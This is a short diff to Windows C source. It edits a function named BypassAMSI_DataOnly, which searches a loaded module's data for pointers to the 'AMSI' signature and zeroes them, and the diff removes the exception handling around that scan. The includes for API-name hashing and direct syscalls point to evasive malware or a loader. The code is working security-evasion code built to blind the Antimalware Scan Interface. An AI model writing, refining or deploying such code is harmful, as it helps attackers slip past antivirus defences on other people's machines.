@@ -4,6 +4,7 @@
 #include <windows.h>
 #include <winternl.h>
 #include <stdio.h>
+#include <shellapi.h>
 #include "api_hashes.h"
 #include "syscalls.h"
 
@@ -44,14 +45,12 @@ static BOOL BypassAMSI_DataOnly() {
 
     PDWORD_PTR pScan = (PDWORD_PTR)pDataStart;
     for (SIZE_T i = 0; i < dataSize / sizeof(DWORD_PTR); i++) {
-        __try {
-            if (pScan[i] && !IsBadReadPtr((PVOID)pScan[i], sizeof(DWORD))) {
-                if (*(PDWORD)pScan[i] == 0x49534D41) { 
-                    pScan[i] = 0; 
-                    return TRUE;
-                }
+        if (pScan[i] && !IsBadReadPtr((PVOID)pScan[i], sizeof(DWORD))) {
+            if (*(PDWORD)pScan[i] == 0x49534D41) { 
+                pScan[i] = 0; 
+                return TRUE;
             }
-        } __except(EXCEPTION_EXECUTE_HANDLER) { continue; }
+        }
     }
     return FALSE;
 }
